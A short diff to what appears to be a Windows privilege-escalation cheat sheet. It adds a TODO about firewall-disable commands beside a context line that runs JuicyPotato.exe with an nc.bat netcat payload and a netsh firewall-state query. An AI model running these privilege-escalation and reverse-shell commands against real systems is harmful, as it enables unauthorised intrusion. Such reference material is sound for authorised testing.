@@ -258,6 +258,8 @@ cmd> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
 Netsh
 ```
 cmd> netsh [advfirewall] firewall show state name=all
+
+TODO: ADD DISABLE COMMANDS
 ```
 
 
